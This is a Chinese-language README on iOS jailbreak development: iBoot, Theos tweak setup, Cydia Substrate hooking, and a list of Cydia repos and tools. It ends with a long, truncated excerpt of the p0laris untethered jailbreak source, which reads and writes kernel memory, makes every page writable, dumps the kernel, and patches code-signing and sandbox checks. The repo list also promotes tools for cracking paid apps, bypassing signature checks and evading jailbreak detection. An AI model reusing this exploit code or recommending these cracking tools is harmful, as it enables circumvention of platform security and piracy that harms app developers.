# iOS应用逆向工程-Cydia越狱开发  
### XLsn0w's Cydia Repo: https://XLsn0w.github.io/tweak/
### XLsn0w's Cydia Repo: https://XLsn0w.github.io/tweaks/
### Cydiapp's Cydia Repo: https://XLsn0w.github.io/Cydiapp/
<img src="https://github.com/XLsn0w/Cydiapp/blob/main/XLsn0w's%20Cydia%20Repo.png?raw=true" alt="XLsn0w" width="470" height="224" align="bottom" />

# 我的微信公众号: Cydiapp


```
//                            _ooOoo_
//                           o8888888o
//                           88" . "88
//                           (| -_- |)
//                            O\ = /O
//                        ____/`---'\____
//                      .   ' \\| |// `.
//                       / \\||| : |||// \
//                     / _||||| -:- |||||- \
//                       | | \\\ - /// | |
//                     | \_| ''\---/'' | |
//                      \ .-\__ `-` ___/-. /
//                   ___`. .' /--.--\ `. . __
//                ."" '< `.___\_<|>_/___.' >'"".
//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
//                 \ \ `-. \_ __\ /__ _/ .-` / /
//         ======`-.____`-.___\_____/___.-`____.-'======
//                            `=---='
//
//         .............................................
//                  佛祖镇楼            逆向寻根
//          佛曰:
//                  写字楼里写字间，写字间里程序员；
//                  程序人员写程序，又拿程序换酒钱。
//                  酒醒只在网上坐，酒醉还来网下眠；
//                  酒醉酒醒日复日，网上网下年复年。
//                  但愿老死电脑间，不愿鞠躬老板前；
//                  奔驰宝马贵者趣，公交自行程序员。
//                  别人笑我忒疯癫，我笑自己命太贱；
//                  不见满街漂亮妹，哪个归得程序员？
```

# iOS Jailbreak Develop-hook-Reverse
<img src="https://github.com/XLsn0w/Cydiapp/blob/main/XLsn0w's%20Cydia%20Repo.png?raw=true" alt="XLsn0w" width="470" height="224" align="bottom" />
# 我的微信公众号: Cydiapp
# 我的微信公众号: Cydia
### XLsn0w's Cydia Repo: https://XLsn0w.github.io/tweak/
### XLsn0w's Cydia Repo: https://XLsn0w.github.io/tweaks/
<img src="https://github.com/XLsn0w/Cydiapp/blob/main/XLsn0w's%20Cydia%20Repo.png?raw=true" alt="XLsn0w" width="470" height="224" align="bottom" />

## iOS iBoot
iBoot是一个二级bootloader，

负责iOS系统的恢复模式。
它可以在手机上运行也可以通过USB线或串口线连接到电脑上。

当设备不处于恢复模式时，iBoot会验证目前设备运行的iOS版本是否合法。

如果发现iOS系统版本非法，就会强迫设备系统重启并强制运行iBoot软件。

这个bootloader以加密的方式存储在设备内部，
是用来保护iOS系统完整性的重要组成部分。
```
void find_boot_images(void) {// 查找启动镜像
	PROFILE_ENTER('FBI');
#if WITH_BLOCKDEV
	struct blockdev *rom_bdev;
	uint32_t i;

	/* iterate over each of the rom devices, looking for images and syscfg data */
	for (i=0; i < sizeof(platform_image_devices)/sizeof(platform_image_devices[0]); i++) {
		rom_bdev = lookup_blockdev(platform_image_devices[i].name);
		if (!rom_bdev)
			continue;

		image_search_bdev(rom_bdev, platform_image_devices[i].image_table_offset, 0);
	}
	
#if WITH_SYSCFG
	/* hook up syscfg data */
	for (i=0; i < sizeof(platform_syscfg_devices)/sizeof(platform_syscfg_devices[0]); i++) {
		if (lookup_blockdev(platform_syscfg_devices[i].name)) {
			if (syscfgInitWithBdev(platform_syscfg_devices[i].name))
				break;
		}
	}
#endif /* WITH_SYSCFG */
#endif /* WITH_BLOCKDEV */
	
	image_dump_list(false);
	PROFILE_EXIT('FBI');
}
```

## PermasigneriOS: 签名任意ipa实现不过期
[PermasigneriOS介绍](https://mp.weixin.qq.com/s?__biz=MzI4NjI4OTg1MA==&mid=2247493186&idx=1&sn=458945fddd390afe384aa93ff36dc406&chksm=ebdd9c97dcaa15813fd6f50750d2ad9c2525504b218461f0f5ca307fc99d847a09813bca989a&token=929453386&lang=zh_CN#rd)

## 永久签名ipa实现不过期插件更新第二版
[PermasigneriOS插件下载](https://mp.weixin.qq.com/s?__biz=MzI4NjI4OTg1MA==&mid=2247493219&idx=1&sn=2589a7c2344c8ea577fe91762df9ee7b&chksm=ebdd9cb6dcaa15a01647e06783a0589850b3cf97993c2a3a1233e222bfc20ccbb7cdad41fbb4&mpshare=1&scene=23&srcid=0709FWFKlzW9B40p07fYNy2Z&sharer_sharetime=1657333987162&sharer_shareid=16bb66cd5fc48e6ac890c05c43ce8981%23rd)

# MonkeyDev 支持Xcode 12安装
## 修复Xcode12 MacOSX Package Types.xcspec not found报错
下载地址: https://github.com/XLsn0w/MonkeyDev_Xcode12

# 遇到的问题
# libstdc++
`Xcode 10`之后删除的`libstdc++`库

1. 先下载下来这个项目，然后打开终端`cd`到`libstdc--master`文件夹；
2. 如果你使用的是 Xcode 10，则将`install-xcode_10.sh`拖到终端中执行即可；
3. Xcode 11 之后的版本则将`install-xcode_11+.sh`拖到终端中执行。

## iOS file not found: /usr/lib/libstdc++.dylib
```
下载解压这个文件 https://github.com/MonkeyDev_Xcode12/Xcode11+libstdc++

~ % cd /Users/xlsn0w/libstdc- 

~ % sudo sh install-xcode_11+.sh
```

<p align="center">
<img src="https://theos.dev/img/github-banner.svg" alt="Theos">
</p>
<p align="center"><strong>
A cross-platform build system for creating iOS,<br>
macOS, Linux, and Windows programs.
</strong></p>
<p align="center">
<a href="https://theos.dev/">Home</a> –
<a href="https://theos.dev/docs/">Documentation</a> –
<a href="https://theos.dev/help">Get Help</a> –
<a href="https://twitter.com/theosdev">@theosdev</a> –
<a href="https://theos.dev/discord">Discord</a>
</p>

## [iOS降级+SHSH备份教程](https://mp.weixin.qq.com/s?__biz=MzI4NjI4OTg1MA==&mid=2247493629&idx=1&sn=c631cd20df678e19d3b9efde790dbf32&chksm=ebdd9d28dcaa143e8585f34e2438cf68f9e35480e8c1f4233ffa52fd8ee9cdc6f55c6da9bea1&token=1447383827&lang=zh_CN#rd)
### 在线备份shsh2 : https://tsssaver.1conan.com/v2/

## Cydia和Sileo 插件源使用指南
Cydia/Sileo 插件源使用指南

图片

Cydia /Sileo 自带源 都是正规, 非测试, 正版插件正版插件，

部分实用工具需要付费购买功能。

大部分插件可在下列源上安装。

https://apt.bingner.com                             (Cydia 自带)

http://apt.thebigboss.org/repofiles/cydia           (Cydia 自带)

https://repo.chariz.com

https://repo.dynastic.com

https://repo.packix.com

https://havoc.app                                   (Sileo 自带)


普通人到这里就行了, 多安装瞎搞, 

平刷还能回来, 不能只能升级系统了

MYbloXX 降级必备

http://myxxdev.github.io

Odyssey https://repo.theodyssey.dev

Rollectra / SemiRestore11

平刷插件，理论上通用

http://xnu.science/repo

Succession iOS 通用平刷工具

https://samgisaninja.github.io/test/ 

https://samgisaninja.github.io



必备依赖包插件!

解决设置列表不显示插件入口(Preferenceloader)

插件不需要安装, 在你安装其他插件会自带附带安装

❶ AppList
❷ Cephei Tweak Support
❸ libcolorpicker

rpetrich个人 源:https://rpetri.ch/repo

❹ Preferenceloader
❺ RocketBootstrap

安装上述五个依赖解决!

AppSync Unified 必备!无视签名，随意安装

https://cydia.akemi.ai


ichitaso个人源

https://cydia.ichitaso.com



iCleaner Pro  必备!最强清理神器

https://ib-soft.net/cydia https://ib-soft.net/cydia/beta


Filza  必备!最强文件管理器

https://tigisoftware.com/cydia


Battery Health Enable 解决更换电池健康度显示问题

https://poomsmart.github.io/repo/


Bakgrunnur 真实后台

https://udevsharold.github.io/repo/


OTAEnabler 恢复系统更新

https://repo.cadoth.net



OTADisabler 屏蔽系统更新

https://cydia.ichitaso.com


CrashReporter 崩溃报告

https://cokepokes.github.io


Appstore++ 应用降级

https://cokepokes.github.io


CyDown 推荐! 一键破解收费

https://julio.hackyouriphone.org

CrackerXI 砸壳工具

http://cydia.iphonecake.com


FlyJB X 屏蔽越狱检测

https://repo.xsf1re.kr


A-Bypass  推荐!超强屏蔽越狱检测

https://repo.co.kr


Haoict 个人源  社交 APP 去广告，保存视频

https://haoict.github.io/cydia


ReProvision Reborn

复活版自签工具

https://repo.packix.com


Zebra 斑马越狱商店

https://getzbra.com/repo


Xenhtml 插件

https://xenpublic.incendo.ws


Xeninfo 插件

http://junesiphone.com/supersecret

Zetsu 分屏插件 iOS 14 

https://dcsyhi1998.github.io

PullOver Pro 分屏

https://c1d3r.com/repo

MilkyWay 分屏

https://deontw.github.io/akusio-Repo-Mirror

shuffle 设置归类

https://creaturesurvive.github.io/repo

Shortmoji 2 键盘增强

https://miro92.com/repo/

h2 作者源

https://lzsxcl.github.io/repo


## 越狱以及Theos环境搭建
```
一、越狱以及Theos环境搭建
      在实现iOS注入前，需要搭建相关的越狱开发环境，具体需要安装的工具和步骤可以参考上一节《IOS平台GDB动态调试介绍》中第一小节的内容。

二、利用Theos实现注入
      在相关的环境配置好后，就可以着手对ios平台的程序进行注入了，这里使用的是Theos越狱工具开发工具包，该工具功能强大、易于安装、操作简单，是ios平台理想的越狱开发工具，有兴趣的读者可以在github上查看工具的源码。接下来主要介绍theos的相关操作。

2.1 新建工程
      在Mac终端的命令行中切换目录至常用的工程目录，并输入“/opt/theos/bin/nic.pl”命令，此时命令行会显示以下列表：
UseriMac:~ user$ /opt/theos/bin/nic.pl
NIC 2.0 - New Instance Creator
------------------------------
  [1.] iphone/application
  [2.] iphone/library
  [3.] iphone/preference_bundle
  [4.] iphone/tool
  [5.] iphone/tweak
      接下来选择“5”就能创建一个tweak工程，然后按照命令行提示输入要创建工程的配置信息，具体内容如下：
Choose a Template (required): 5
Project Name (required): test
Package Name [com.yourcompany.test]: com.gameprotect.test
Author/Maintainer Name [xx]: xxx
[iphone/tweak] MobileSubstrate Bundle filter [com.apple.springboard]: com.apple.springboard
[iphone/tweak] List of applications to terminate upon installation (space-separated, '-' for none) [SpringBoard]: SpringBoard
Instantiating iphone/tweak in testdxy/...
Done.
      其中Project Name、Package Name和Author Name都比较好理解；第四个MobileSubstrate Bundle filter是要注入程序的BundleID，默认的进程为com.apple.springboard，为了演示方便，在此先使用默认进程作为注入对象，读者可以根据各自需要输入对应的进程名；List of applications to terminate upon installation是tweak安装后要重启的进程名，该信息和刚输入的进程BundleID对应，此处笔者同样输入默认的进程名SpringBoard。配置输入完后命令行出现“Done.”时即完成了工程的创建工作。
```

##      Tweak工程目录文件介绍

## control文件
      首先介绍的是control文件，该文件记录了工程的基本信息，新建的test工程中control文件各字段内容如下：
```
Package: com.gameprotect.test
Name: test
Depends: mobilesubstrate
Version: 0.0.1
Architecture: iphoneos-arm
Description: An awesome MobileSubstrate tweak!
Maintainer: xxx
Author: xxx
Section: Tweaks
```
       从上面的内容可以看出，Package、Name、Maintainer、Author等字段是在建立工程时由命令行输入的；
       而Depends、Version、Description等字段从字面意义也很好理解，
       值得说明的是Depends字段，读者可以根据需要指定工程的固件版本、软件程序等依赖条件，
       若运行环境不满足依赖条件则程序无法运行，这三个字段在一般情况下可以不用更改；
       最后是Architecture和Section字段，该字段指定了要安装的程序的设备架构以及程序类型，不能更改。

##  MakeFile文件
      接下来介绍MakeFile文件，该文件用来指定工程要用到的文件、框架等信息，
      新建的test工程中MakeFile文件各字段内容如下：
```
include theos/makefiles/common.mk
TWEAK_NAME = test
test_FILES = Tweak.xm
include $(THEOS_MAKE_PATH)/tweak.mk
after-install::
    install.exec "killall -9 SpringBoard"
```
       其中第一行的include字段指定了工程的common.mk文件，
       该文件通常不会变化，因此不需修改
       ；TWEAK_NAME字段填入的是建立工程时命令行输入的Project Name；
       test_FILES字段指定工程包含的源文件，如果工程中需要用到多个源文件则用空格将各个文件名分开；
       第三行的include字段指定工程的mk文件，这里新建的是tweak工程，
       所以填入的是tweak.mk文件，还可以根据需求填入application.mk以及tweak.mk文件；
       最后一行after-install字段指定安装程序后需要执行的操作，
       这里需要注入SpringBoard进程并执行自己的代码，
       因此需要重启SpringBoard进程达到目的。
       
       MakeFile文件除了自动生成的这些字段外，
       还可以根据功能手动添加其他字段：
       ARCHS字段可以用来指定处理器架构，
       一般情况下填写“ARCHS = arm64 arm64e”即可；
       TARGET字段用来指定SDK版本；
       framework字段可以指定要导入的框架，
       比如这里的测试demo中填写的是“test_FRAMEWORKS = UIKit”，
       UIKit为后续测试代码需要用到的框架，
       另一方面，还可以通过test_PRIVATE_FRAMEWORKS字段指定要导入的私有库，
       格式不变。
       
     测试的MakeFile文件修改后的完整内容如下：

```
ARCHS = armv7 arm64
include theos/makefiles/common.mk
TWEAK_NAME = test
test_FILES = Tweak.xm
test_FRAMEWORKS = UIKit
include $(THEOS_MAKE_PATH)/tweak.mk
after-install::
    install.exec "killall -9 SpringBoard"
```

## Contributors
<table>
<tr>
<td align="center"><a href="https://github.com/kirb"><img src="https://github.com/kirb.png" width="100" alt=""><br>kirb</a></td>
<td align="center"><a href="https://github.com/uroboro"><img src="https://github.com/uroboro.png" width="100" alt=""><br>uroboro</a></td>
<td align="center"><a href="https://github.com/kabiroberai"><img src="https://github.com/kabiroberai.png" width="100" alt=""><br>kabiroberai</a></td>
<td align="center"><a href="https://github.com/DHowett"><img src="https://github.com/DHowett.png" width="100" alt=""><br>DHowett</a></td>
<td align="center"><a href="https://github.com/rpetrich"><img src="https://github.com/rpetrich.png" width="100" alt=""><br>rpetrich</a></td>
</tr>
</table>

# -----------------------------------
### “MonkeyDev error: Signing for “xlsn0wDylib” requires a development team.”
### “Select a development team in the Signing & Capabilities editor.”

在Xcode中 选中Dylib对应的target (in target ‘xlsn0wDylib’)

点击Build Settings 中

添加"CODE_SIGNING_ALLOWED = NO" 关闭对Dylib的Code签名
# -----------------------------------

# Cydia Substrate 
## - 底层使用Method Swizzle 和 fishhook实现

Cydia Substrate 原名为 Mobile Substrate 由SaurikIT开发
它的主要作用是针对OC方法、C函数以及函数地址进行HOOK操作。当然它并不是仅仅针对iOS而设计的，安卓一样可以用。
官方地址：http://www.cydiasubstrate.com/

## libsubstrate.dylib 库文件
## libsubstitute.dylib 库文件

从越狱的iPhone上拷贝/Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate 到Mac电脑的目录 /opt/theos/lib/ ,并修改名称为 libsubstrate.dylib

### 如果是使用unc0ver越狱的话, 用Filza从 /usr/lib/libsubstitute.dylib 复制到Mac电脑的目录 /opt/theos/lib/

Cydia Substrate主要由3部分组成：

MobileHooker
MobileHooker顾名思义用于HOOK。它定义一系列的宏和函数，底层调用objc的runtime和fishhook来替换系统或者目标应用的函数.
```
其中有两个函数:
 void MSHookMessageEx(Class class, SEL selector, IMP replacement, IMP result)
 主要作用于Objective-C方法
 
 void MSHookFunction(voidfunction,void* replacement,void** p_original)
 主要作用于C和C++函数, Logos语法的%hook 就是对此函数做了一层封装
 
 利用DCRM V4搭建Cydia Repo教程 https://github.com/XLsn0w/Dumb-Cydia-Repository-Manager

添加公众号Cydia源:
Cydia Repo: https://XLsn0w.github.io/tweak/
Cydia Repo: https://XLsn0w.github.io/tweaks/
Cydia Repo: https://XLsn0w.github.io/Cydiapp/

iOS进阶福利群
QQ会员群号: 582415518 (内含稀缺资源下载)
点击赞赏二维码+WeChat

iOS教学
Cydia C++源码
iOS13-14越狱源代码
iOS14.5完美越狱实现源码
``` 
## 解决Mac终端 Failed to connect to raw.githubusercontent.com port 443
## 解决 raw.githubusercontent.com 无法访问
1.打开
https://www.ipaddress.com
2.这个网站中的查询框中输入：raw.githubusercontent.com   
3.回车
4.在里面找到raw.githubusercontent.com相对应的ipv4地址：
5.前四个地址随便选一个即可：
```
🇺🇸 raw.githubusercontent.com	A	185.199.108.133
🇺🇸 raw.githubusercontent.com	A	185.199.109.133
🇺🇸 raw.githubusercontent.com	A	185.199.110.133
🇺🇸 raw.githubusercontent.com	A	185.199.111.133
```
6.在cmd+shift+G 输入/etc/hosts
7.在hosts 添加一行代码 如下
```
185.199.108.133     raw.githubusercontent.com
```

## iOS获取任何砸壳ipa的资源图片工具
iOS Images Extractor : https://github.com/devcxm/iOS-Images-Extractor

## iOS调试UI的工具Lookin
Lookin 可以查看与修改 iOS App 里的 UI 对象，
类似于 Xcode 自带的 UI Inspector 工具，
或另一款叫做 Reveal 的软件。 官网：https://lookin.work/

## 如果.ipa或.app是做了防护 只能runtime classdumpdyld弄了
参考文章: https://mp.weixin.qq.com/s/m1TUrSfc4cvYbGAcGAtQeg
![](https://mmbiz.qpic.cn/mmbiz/e1CScbLqXaDU745odDN2fHpcCu9VhicGElVgalW9QJcKLicRqJNHor0FgMxuicX8CKnbeqMV6Svib6EQ9BbXbfAv7g/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1)
```
#cycript -p SpringBoard

@import net.limneos.classdumpdyld;

classdumpdyld.dumpClass(SpringBoard);
@"Wrote file /tmp/SpringBoard.h"

classdumpdyld.dumpBundle([NSBundle mainBundle]);
@"Wrote all headers to /tmp/SpringBoard"

// Dump any bundle other than the main bundle 
classdumpdyld.dumpBundle([NSBundle bundleWithIdentifier:@"com.apple.UIKit"]);
@"Wrote all headers to /tmp/UIKit"

// Dump any image loaded in the process using any class name it contains
classdumpdyld.dumpBundleForClass(CallBarControllerModern);
@"Wrote all headers to /tmp/CallBar7"
```

###  iOS untethered jailbreak for iOS 9.x and 10.x p0laris Implementation principle
```
#include <Foundation/Foundation.h>
#include <UIKit/UIKit.h>
#include <sys/utsname.h>
#include <sys/mount.h>
#include <mach/mach.h>
#include <sys/stat.h>
#include <syslog.h>
#include <dlfcn.h>
#include <spawn.h>

#import "patchfinder.h"
#import "common.h"
#import "sbops.h"
#import "log.h"

/*
 *  I live in a constant state of fear and misery
 *  Do you miss me anymore?
 *  And I don't even notice when it hurts anymore
 *  Anymore, anymore, anymore
 */

#define INSTALL_NONPUBLIC_UNTETHER 0
#define FIRST_TIME_OVERRIDE 0
#define INSTALL_UNTETHER 0
#define BTSERVER_USED 0
#define UNPATCH_PMAP 0
#define ENABLE_DEBUG 0
#define DO_CSBYPASS 0
#define DUMP_KERNEL 0

uintptr_t kernel_base	= -1;
uintptr_t kaslr_slide	= -1;
task_t tfp0				= 0;

uintptr_t kbase(void);
task_t get_kernel_task(void);
void exploit_cleanup(task_t);
int progress(const char* s, ...);
int progress_ui(const char* s, ...);

#define UNSLID_BASE 0x80001000

// A5
uint32_t pmap_addr = 0x003F6454;

uint32_t find_kernel_pmap(void) {
	return pmap_addr + kernel_base;
}

/*
 *  read 4-bytes from address addr from kernel memory
 */
uint32_t kread_uint32(uint32_t addr) {
	vm_size_t bytesRead=0;
	uint32_t ret = 0;
	vm_read_overwrite(tfp0,
					  addr,
					  4,
					  (vm_address_t)&ret,
					  &bytesRead);
	return ret;
}

/*
 *  read a byte from address addr from kernel memory
 */
uint8_t kread_uint8(uint32_t addr) {
	vm_size_t bytesRead=0;
	uint8_t ret = 0;
	vm_read_overwrite(tfp0,
					  addr,
					  1,
					  (vm_address_t)&ret,
					  &bytesRead);
	return ret;
}

/*
 *  write a 4-byte value to address addr in kernel memory
 */
void kwrite_uint32(uint32_t addr, uint32_t value) {
	vm_write(tfp0,
			 addr,
			 (vm_offset_t)&value,
			 4);
}

/*
 *  write a byte value to address addr in kernel memory
 */
void kwrite_uint8(uint32_t addr, uint8_t value) {
	vm_write(tfp0,
			 addr,
			 (vm_offset_t)&value,
			 1);
}

/*
 *  free and nullify pointer macro
 */
void _zfree(void** ptr) {
	free(*ptr);
	*ptr = NULL;
}

#define zfree(ptr) do { _zfree((void**)ptr); } while (0)

extern char **environ;

void run_cmd(char *cmd, ...) {
	pid_t pid;
	va_list ap;
	char* cmd_ = NULL;
	
	va_start(ap, cmd);
	vasprintf(&cmd_, cmd, ap);
	
	char *argv[] = {"sh", "-c", cmd_, NULL};
	
	int status;
	lprintf("Run command: %s", cmd_);
	status = posix_spawn(&pid, "/bin/sh", NULL, NULL, argv, environ);
	if (status == 0) {
		lprintf("Child pid: %i", pid);
		do {
			if (waitpid(pid, &status, 0) != -1) {
				lprintf("Child status %d", WEXITSTATUS(status));
			} else {
				perror("waitpid");
			}
		} while (!WIFEXITED(status) && !WIFSIGNALED(status));
	} else {
		lprintf("posix_spawn: %s", strerror(status));
	}
}

bool exists(char* path) {
	bool ret = false;
	
	/*
	 *  check if file exists and is accessible
	 */
	
	ret = access(path, F_OK) != -1;
	
	return ret;
}

/*
 *  BEGIN ADVANCED BORROWING FROM REALKJCMEMBER
 */
#define TTB_SIZE			4096
#define L1_SECT_S_BIT		(1 << 16)
#define L1_SECT_PROTO		(1 << 1)														/* 0b10 */
#define L1_SECT_AP_URW		(1 << 10) | (1 << 11)
#define L1_SECT_APX			(1 << 15)
#define L1_SECT_DEFPROT		(L1_SECT_AP_URW | L1_SECT_APX)
#define L1_SECT_SORDER		(0)																/* 0b00, not cacheable, strongly ordered. */
#define L1_SECT_DEFCACHE	(L1_SECT_SORDER)
#define L1_PROTO_TTE(entry)	(entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)

uint32_t pmaps[TTB_SIZE];
int pmapscnt = 0;

void patch_kernel_pmap(void) {
	uint32_t kernel_pmap		= find_kernel_pmap();
	uint32_t kernel_pmap_store	= kread_uint32(kernel_pmap);
	uint32_t tte_virt			= kread_uint32(kernel_pmap_store);
	uint32_t tte_phys			= kread_uint32(kernel_pmap_store+4);
	
	lprintf("kernel pmap store @ 0x%08x",
			kernel_pmap_store);
	lprintf("kernel pmap tte is at VA 0x%08x PA 0x%08x",
			tte_virt,
			tte_phys);
	
	/*
	 *  every page is writable
	 */
	uint32_t i;
	for (i = 0; i < TTB_SIZE; i++) {
		uint32_t addr   = tte_virt + (i << 2);
		uint32_t entry  = kread_uint32(addr);
		if (entry == 0) continue;
		if ((entry & 0x3) == 1) {
			/*
			 *  if the 2 lsb are 1 that means there is a second level
			 *  pagetable that we need to give readwrite access to.
			 *  zero bytes 0-10 to get the pagetable address
			 */
			uint32_t second_level_page_addr = (entry & (~0x3ff)) - tte_phys + tte_virt;
			for (int i = 0; i < 256; i++) {
				/*
				 *  second level pagetable has 256 entries, we need to patch all
				 *  of them
				 */
				uint32_t sladdr  = second_level_page_addr+(i<<2);
				uint32_t slentry = kread_uint32(sladdr);
				
				if (slentry == 0)
					continue;
				
				/*
				 *  set the 9th bit to zero
				 */
				uint32_t new_entry = slentry & (~0x200);
				if (slentry != new_entry) {
					kwrite_uint32(sladdr, new_entry);
					pmaps[pmapscnt++] = sladdr;
				}
			}
			continue;
		}
		
		if ((entry & L1_SECT_PROTO) == 2) {
			uint32_t new_entry  =  L1_PROTO_TTE(entry);
			new_entry		   &= ~L1_SECT_APX;
			kwrite_uint32(addr, new_entry);
		}
	}
	
	lprintf("every page is actually writable");
	usleep(100000);
}

void pmap_unpatch(void) {
	while (pmapscnt > 0) {
		uint32_t sladdr  = pmaps[--pmapscnt];
		uint32_t slentry = kread_uint32(sladdr);
		
		/*
		 *  set the 9th bit to one
		 */
		uint32_t new_entry = slentry | (0x200);
		kwrite_uint32(sladdr, new_entry);
	}
}

/*
 *  END ADVANCED BORROWING FROM REALKJCMEMBER
 */

double get_time(void) {
	struct timeval current_time;
	gettimeofday(&current_time, NULL);
	
	return (double)current_time.tv_sec
	+ ((double)current_time.tv_usec / 1000000.0);
}

uint8_t* dump_kernel(uint8_t* kdata, uint32_t len) {
	vm_size_t segment = 0x800;
	
	/*
	 *  0x800 should be faster thx sig
	 */
	
	for (int i = 0; i < len / segment; i++) {
		/*
		 *  DUMP DUMP DUMP
		 */
		
		vm_read_overwrite(tfp0,
						  UNSLID_BASE + kaslr_slide + (i * segment),
						  segment,
						  (vm_address_t)kdata + (i * segment),
						  &segment);
	}
	
	return kdata;
}

extern struct offsets_t* offsets;
extern bool global_untethered;
uint32_t ourcred;
uint32_t myproc;

struct offsets_t* find_offsets(void) {
	/*
	 *  look ma i did a patchfinder
	 *  saves offsets to (docs_dir)/offsets.bin for future use, as the patchfinder
	 *  is kinda slow as balls
	 */
	
	struct offsets_t* offsets   = malloc(sizeof(struct offsets_t));
	uint32_t len				= 32 * 1024 * 1024;
	uint8_t* kdata				= NULL;
	char* open_this				= NULL;
	char* version_string		= (char*)[[[UIDevice currentDevice] systemVersion]
										  UTF8String];
	
	if (!global_untethered) {
		/*
		 *  if we are not running from the untether, check the application docs
		 *  directory for the offsets.bin file. if it exists, read it into the
		 *  offsets struct and return it, otherwise, find our offsets "manually"
		 *  using the patchfinder.
		 */
		
		NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
		NSString *documentsDirectory = [paths firstObject];
		char* doc_dir = (char*)[documentsDirectory UTF8String];
		asprintf(&open_this, "%s/offsets.bin", doc_dir);
		
		if (exists(open_this)) {
			/*
			 *  read from offsets.bin into the offsets struct and return it
			 */
			
			FILE* fp = fopen(open_this, "rb");
			fread(offsets, sizeof(struct offsets_t), 1, fp);
			fclose(fp);
			return offsets;
		}
	} else {
		/*
		 *  if we are running from the untether, read from
		 *  /untether/docs/untether.bin (if the file exists) to get offsets. 
		 *  /untether/docs is a symlink to the normal documents directory. this
		 *  is done because the documents directory appears to be different when
		 *  running untethered.
		 * 
		 *  (also because i originally tried /untether/offsets.bin until i 
		 *   realized we can't read from that path when not jailbroken, lol)
		 */
		
		char* offsets_bin = "/untether/docs/offsets.bin";
		
		if (exists(offsets_bin)) {
			/*
			 *  read from offsets.bin into the offsets struct and return it
			 */
			
			FILE* fp = fopen(offsets_bin, "rb");
			fread(offsets, sizeof(struct offsets_t), 1, fp);
			fclose(fp);
			return offsets;
		}
	}
	
	/*
	 *  dump kernel
	 */
	
	progress_ui("dumping kernel");
	kdata = malloc(len);
	
	dump_kernel(kdata, len);
	
	if (!kdata) {
		/*
		 *  fuck, failed to allocate kdata.
		 * 
		 *  free offsets if it exists, zfree also sets it to NULL. (fuck UAFs)
		 *  (except when i get to exploit them ;))
		 */
		if (offsets)
			zfree(&offsets);
		return NULL;
	}
	
	/*
	 *  make substrate patchfinding a bit faster
	 */
	uint32_t* one_and_two = NULL;
	
	progress_ui("patchfinding...");
	offsets->mount_common						= find_mount_common(kernel_base, kdata, len, version_string);
	offsets->lwvm1								= find_lwvm1(kernel_base, kdata, len, version_string);
	offsets->lwvm2								= find_lwvm2(kernel_base, kdata, len, version_string);
	offsets->lwvm_call							= find_lwvm_call(kernel_base, kdata, len, version_string);
	offsets->lwvm_call_offset					= find_lwvm_call_offset(kernel_base, kdata, len, version_string);
	offsets->sbops								= find_sbops(kernel_base, kdata, len, version_string);
	one_and_two									= find_substrate1_and_2(kernel_base, kdata, len, version_string);
	offsets->substrate1							= one_and_two[0];
	offsets->substrate2							= one_and_two[1];
	offsets->proc_enforce						= find_proc_enforce(kernel_base, kdata, len, version_string);
	offsets->cs_enforcement_disable_amfi		= find_cs_enforcement_disable_amfi(kernel_base, kdata, len, version_string);
	offsets->PE_i_can_has_debugger_1			= find_PE_i_can_has_debugger_1(kernel_base, kdata, len, version_string);
	offsets->PE_i_can_has_debugger_2			= find_PE_i_can_has_debugger_2(kernel_base, kdata, len, version_string);
	offsets->PE_i_can_has_debugger_offset		= find_PE_i_can_has_debugger_offset(kernel_base, kdata, len, version_string);
	offsets->vm_fault_enter_patch				= find_vm_fault_enter_patch(kernel_base, kdata, len, version_string);
	offsets->vm_map_enter_patch					= find_vm_map_enter_patch(kernel_base, kdata, len, version_string);
	offsets->csops								= find_csops(kernel_base, kdata, len, version_string);
	offsets->mapForIO							= find_mapForIO(kernel_base, kdata, len, version_string);
	offsets->sandbox_call_i_can_has_debugger	= find_sandbox_call_i_can_has_debugger(kernel_base, kdata, len, version_string);
	offsets->amfi_file_check_mmap				= find_amfi_file_check_mmap(kernel_base, kdata, len, version_string);
	offsets->allproc							= find_allproc(kernel_base, kdata, len, version_string);
	offsets->tfp0								= find_tfp0(kernel_base, kdata, len, version_string);
	progress_ui("patchfinded");
	
	/*
	 *  write our offsets to docs_dir/offsets.bin
	 */
	
	open_this = NULL;
	
	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
														 NSUserDomainMask,
														 YES);
	NSString *documentsDirectory = [paths firstObject];
	char* doc_dir = (char*)[documentsDirectory UTF8String];
	asprintf(&open_this, "%s/offsets.bin", doc_dir);
	
	FILE* fp = fopen(open_this, "wb");
	fwrite(offsets,
		   sizeof(struct offsets_t),
		   1,
		   fp);
	fclose(fp);
	
	if (one_and_two)
		zfree(&one_and_two);
	
	if (kdata)
		zfree(&kdata);
	
	return offsets;
}

bool patch_kernel(void) {
	bool ret = true;
	
	/* 
	 *  here be dragons, this code is magic
	 */
	
	offsets = find_offsets();
	
	if (offsets == NULL)
		return false;
	
	/* 
	 *  mount stuff
	 */
	lprintf("patching mount_common: 0x%08x,0x%02x",
			kernel_base + offsets->mount_common, 0xe0);
	kwrite_uint8(kernel_base + offsets->mount_common, 0xe0);
	
	/* 
	 *  PE_i_can_has_debugger stuff
	 */
	lprintf("patching PE_i_can_has_debugger_offset: 0x%08x,0x%08x->0x%08x",
			kernel_base + offsets->PE_i_can_has_debugger_offset, kread_uint32(kernel_base + offsets->PE_i_can_has_debugger_offset), 0x20012001);
	kwrite_uint32(kernel_base + offsets->PE_i_can_has_debugger_offset,
				  0x20012001);
	
	/* 
	 *  note for tomorrow / today:
	 *  look into patching time related syscalls in the kernel
	 */
	
	/*
	 *  this AMFI patch is disabled as the offset was probably wrong or something
	 *  for some reason it would make video decoding cause a magical kernel panic
	 */
	
	/* 
	 *  substrate
	 */
	lprintf("patching substrate1: 0x%08x,0x%04x",
			kernel_base + offsets->substrate1,
			0xbf00);
	kwrite_uint8(kernel_base + offsets->substrate1,		0x00);
	kwrite_uint8(kernel_base + offsets->substrate1 + 1,	0xbf);
	
	/* 
	 *  substrate
	 */
	lprintf("patching substrate2: 0x%08x,0x%04x",
			kernel_base + offsets->substrate2,
			0xbf00);
	kwrite_uint8(kernel_base + offsets->substrate2,		0x00);
	kwrite_uint8(kernel_base + offsets->substrate2 + 1,	0xbf);
	
	/* 
	 *  proc_enforce -> 0
